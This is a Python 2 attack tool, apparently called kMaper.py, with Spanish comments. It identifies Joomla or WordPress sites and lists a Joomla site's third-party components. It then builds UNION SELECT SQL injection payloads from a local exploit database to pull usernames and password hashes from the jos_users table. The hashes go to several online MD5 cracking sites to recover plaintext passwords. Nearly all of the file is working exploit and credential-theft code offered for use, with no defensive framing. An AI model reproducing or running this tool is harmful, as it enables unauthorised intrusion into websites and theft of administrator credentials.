#-*- coding:utf-8 -*-
import time,sys,re,os, urllib, urllib2
import sqlite3 as lite
from BeautifulSoup import BeautifulSoup
from urllib import FancyURLopener
componentes = []
datosAccesoMD5 = []
class Browser(FancyURLopener):
	version = 'Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)'
def getHTML(urlBase):
	nBrowser = Browser()
	html = nBrowser.open(urlBase)
	return html.read()
def outScreen(msg,case):
	str(msg)
	normal = "\033[1;m"
	warning  = "\033[1;33;41m"
	green  = "\033[0;32m"
	greenB  = "\033[1;32m"
	red  = "\033[0;31m"
	redB  = "\033[1;31m"
	yellow  = "\033[0;33m"
	yellowB  = "\033[1;33m"
	blue = "\033[0;34m"
	blueB = "\033[1;34m"
	white = "\033[0;37m"
	whiteB = "\033[1;37m"
	if case == 'green':
		return  green + getTime() + ' -> ' +msg + normal
	elif case == 'greenB':
		return  greenB + msg + normal
	elif case == 'red':
		return  red + getTime() + ' -> ' + msg + normal
	elif case == 'redB':
		return  redB + msg + normal
	elif case == 'yellow':
		return  yellow + msg + normal
	elif case == 'yellowB':
		return  yellowB + msg + normal
	elif case == 'blue':
		return  blue + msg + normal
	elif case == 'blueB':
		return  blueB + msg + normal
	elif case == 'white':
		return  white + getTime() + ' -> ' + msg + normal
	elif case == 'whiteB':
		return  whiteB + getTime() + ' -> ' + msg + normal
	else:
		return  warning + getTime() + ' -> '+ msg + normal
	return 0
def checkIfJoomla(SITE):
	nBrowser = Browser()
	print outScreen('Chekando si es un Joomla... ','white')
	cJoomla = nBrowser.open(SITE+"/administrator")
	if (cJoomla.getcode() == 200):
		print outScreen(SITE,'green')+' -> '+outScreen('posible Joomla!\n','yellowB')
		print outScreen('Confirmando...','whiteB')
		htmlCode = cJoomla.read()
		#htmlCode = 'a href="http://www.jeoomla.org" target="_blank">jsoomla!</';
		if htmlCode.find("joomla") > 0: # chekamos si existe "joomla" en index.php de /administrator
			metas = BeautifulSoup(getHTML(SITE))
			print outScreen(SITE + ' -> ','green')+outScreen('Motor Joomla confirmando!!\n','greenB')
			i = 0
			for tag in metas.findAll('meta', content=True): # meter URLS en un ARRAY sin repetir
				i = i +1
				if(i > 3):
					if (i == 4):
						print outScreen(getTime() + ' -> ' +str(tag['content'].encode('utf-8')),'greenB')
					else:
						print outScreen(tag['content'].encode('utf-8'),'')
			print
			getInfoJoomla(SITE) # Extraemos info desde joomla
		else:
			print 
			checkIfWP(SITE) # saltamos a chekar si es un WP

	else:
		print outScreen('Error 404 Not Found','red')
		print 
		checkIfWP(SITE)
	print

def checkIfWP(SITE):
	nBrowser = Browser()
	print outScreen('Chekando Worpdress...','white')
	cWordpress = nBrowser.open(SITE+"/wp-login.php")
	if (cWordpress.getcode() == 200):
		print outScreen('Posible WordPress...','green')
		htmlCode = cWordpress.read()
		#print htmlCode
		if htmlCode.find("wordpress") > 0: # chekamos si existe "joomla" en index.php de /administrator
			print outScreen(SITE + ' -> ','green')+outScreen('Motor Worpdress confirmando!!\n','greenB')
			print 'traajamos con WP'
		else:
			motorDesconocido()

	else:
		print outScreen('Error 404 Not Found','red')
		motorDesconocido()
def motorDesconocido():
	print 'Motor desconocido!'
	exit(1)
def getTime():
	horaNow = time.asctime()
	return horaNow[11:20]

def checkOnDB(component,SITE):
	try:
		con = lite.connect('kmaper.db')
		cur = con.cursor()     
		cur.execute("SELECT * FROM bugsSQLi where kname='"+component+"'")
		print outScreen("Buscando exploit para -> ",'whiteB')+outScreen(component,'yellowB')
		time.sleep(3)
		rows = cur.fetchall()
		onDB = 0
		for row in rows:
			if row[4] == component : onDB = 1
		if onDB == 1: # Preparamos la SQLi
			print outScreen('Exploit encontrado para','green'),'->',outScreen(component,'greenB')
			columns = int(row[8])
			xpl = int(row[9])
			i = 0
			while i < columns:
				i = i + 1
				if i == 1:sqli = '1'
				else:
					if i == xpl:
						sqli = sqli+','+'concat(0x3c6b206b6d617065723d22,username,0x223e6b6d617065723c2f613e,0x3a3a,0x3c6b206b6d617065723d22,password,0x223e6b6d617065723c2f613e)'
					else:
						sqli = sqli + ',' + str(i)
			target = SITE+'/'+row[5]+'999 union select '+sqli+' from jos_users--'
			print outScreen('Extrayendo datos de acceso...','whiteB')
			nBrowser = Browser()
			gHash = nBrowser.open(target)
			#print target
			if (gHash.getcode() == 200):
				urls = BeautifulSoup(gHash)
				k = 0
				for datos in urls.findAll('k', kmaper=True): #
					datos = datos['kmaper']
					print outScreen(SITE + ' -> Login: ','whiteB')+outScreen(datos[0:32].encode('utf-8'),'greenB')
					if datos[0:32] not in datosAccesoMD5: # Guardamos los hashes en un []
						datosAccesoMD5.append(datos[0:32])
					k = k + 1
				if k > 0:
					print outScreen(str(k/2)+' Datos de acceso encontrados!','')
					print ''
					desencriptar(SITE,datosAccesoMD5) # Enviamos a desencriptar
				else:
					print outScreen('Osea no tuviste suerte','')
				print
			else:
				print outScreen('No se pudo obtener datos ...','green')
		else:
			print outScreen('No encontrado!','red'),'->',outScreen(component+'\n','redB')
	except lite.Error, e:
		if con:
			con.rollback()
		print "Error %s:" % e.args[0]
		sys.exit(1)	
	finally:
		if con:
			con.close()

def getInfoJoomla(SITE):
	print outScreen('Buscando componentes...','whiteB')
	urls = BeautifulSoup(getHTML(SITE))
	for tag in urls.findAll('a', href=True): # meter URLS en un ARRAY sin repetir
		url = tag['href']
		#print 'Global ->',url
		protocolo = re.match("(.*?)://", SITE)
		if url.find(protocolo.group(1)+"://") < 0 : url = SITE+url # Seteando http://www.example.com/index.php?option=...
		#print 'new ->',url
		if url.find(SITE) >= 0 and url.find("option=com_") >= 0: # Solo URL's internas & siempre las URL's tipo "option=com_*"
			#print url
			getComps = re.match("(.*?)option\=(.*?)\&", url)
			if(getComps.group(2) != 'com_content' and getComps.group(2) != 'com_search' and getComps.group(2) != 'com_contact' and getComps.group(2) != 'com_user'): # exepto los com_* del nucleo de Joomla!	
				if getComps.group(2) not in componentes:
					componentes.append(getComps.group(2)) 
	for comp in componentes:
		print outScreen(SITE,'green'),'->',outScreen(comp,'greenB')
	print outScreen(str(len(componentes))+" componentes encontrados!",'')
	print
	for component in componentes:
		checkOnDB(component,SITE)
	return 0
def md5online(hash):
	pre = urllib.urlencode({'md5':hash,'search':0,'action':'decrypt','a':24628722})
	try:
	    html = urllib2.urlopen('http://www.md5online.es/', pre, 100)	
	    # :limegreen'>Encontrado : <b>Bolivia</b></span><br />
	    buscar = re.search(r'(Encontrado : <b>)(.+[^>])(</b></span><br />)', html.read())
	    if buscar:
	        return outScreen(buscar.group(2),'greenB')
	    else:
	        return 1 #'No Encontrado!'
	except urllib2.URLError:
	    return 2 #'Error en el sitio de consulta' 
def md5decryption(hash):
	pre = urllib.urlencode({'hash':hash,'submit':'Decrypt+It'})
	try:
	    html = urllib2.urlopen('http://md5decryption.com/', pre, 100)	
	    # <font size="2">Decrypted Text: </font></b><font size="2">Bolivia</font>
	    buscar = re.search(r'(Decrypted Text: </b>)(.+[^>])(</font><br/><center>)', html.read())
	    if buscar:
	        return outScreen(buscar.group(2),'greenB')
	    else:
	        return 1 #'No Encontrado!'
	except urllib2.URLError:
	    return 2 #'Error en el sitio de consulta'
def MD5myAddr(hash):
	pre = urllib.urlencode({'md5':hash,'submit':'Put MD5 hash here'})
	try:
	    html = urllib2.urlopen('http://md5.my-addr.com/md5_decrypt-md5_cracker_online/md5_decoder_tool.php', pre, 100)	
	    # no pude sacar con expresiones regulares :(
	    spp = html.read().split("<span class='middle_title'>Hashed string</span>: ")
	    if(len(spp) == 2):
		    s1 = spp[1].split("</div>")
		    return outScreen(s1[0],'greenB')
	except urllib2.URLError:
	    return 2 #'Error en el sitio de consulta'
def desencriptar(SITE,hashes):
	k = 0
	for hash in hashes:
		desencriptado = False
		if ((k % 2) == 1):
			if(desencriptado == False):
				print outScreen('Enviando -> ' + hash,'whiteB') + outScreen(' -> md5online.com','blueB')
				respuesta = md5online(hash)
				if (respuesta != 1 and respuesta != 2):
					print outScreen(SITE + ' -> ' + hashes[k-1].encode('utf-8') + ' -> ','whiteB') + outScreen(str(respuesta).encode('utf-8'),'redB')
					desencriptado = True
					print
				else:
					print outScreen(hash + ' -> ','whiteB') + outScreen('no encontrado!','redB')
					print
			if(desencriptado == False):
				print outScreen('Enviando -> ' + hash,'whiteB') + outScreen(' -> md5decryption.com','blueB')
				respuesta = md5decryption(hash)
				if (respuesta != 1 and respuesta != 2):
					print outScreen(SITE + ' -> ' + hashes[k-1].encode('utf-8') + ' -> ','whiteB') + outScreen(str(respuesta).encode('utf-8'),'redB')
					desencriptado = True
					print
				else:
					print outScreen(hash + ' -> ','whiteB') + outScreen('no encontrado!','redB')
					print
			if(desencriptado == False):
				print outScreen('Enviando -> ' + hash,'whiteB') + outScreen(' -> MD5myAddr.com','blueB')
				respuesta = MD5myAddr(hash)
				if (respuesta != 1):
					print outScreen(SITE + ' -> ' + hashes[k-1].encode('utf-8') + ' -> ','whiteB') + outScreen(str(respuesta).encode('utf-8'),'redB')
					desencriptado = True
					print
				else:
					print outScreen(hash + ' -> ','whiteB') + outScreen('no encontrado!','redB')
					print
		k = k + 1

def getSITE(urlBase):
	if urlBase.find('/') <= 0 : urlBase = urlBase+'/'
	if urlBase.startswith('www') : urlBase = 'http://'+urlBase
	SITE = re.match("(.+)\/", urlBase)
	return SITE.group(1)
def welcome():
	print "Main"
	print "Como usar blabla"
def newbie(msg,example):
	print msg
	print
	print example
def empezando(SITE):
	header()
	print time.asctime()
	print 'Testeando...',outScreen(SITE,'greenB')
	print
def header():
	print 'kMaper.py'
	print '====================================================================='

	print
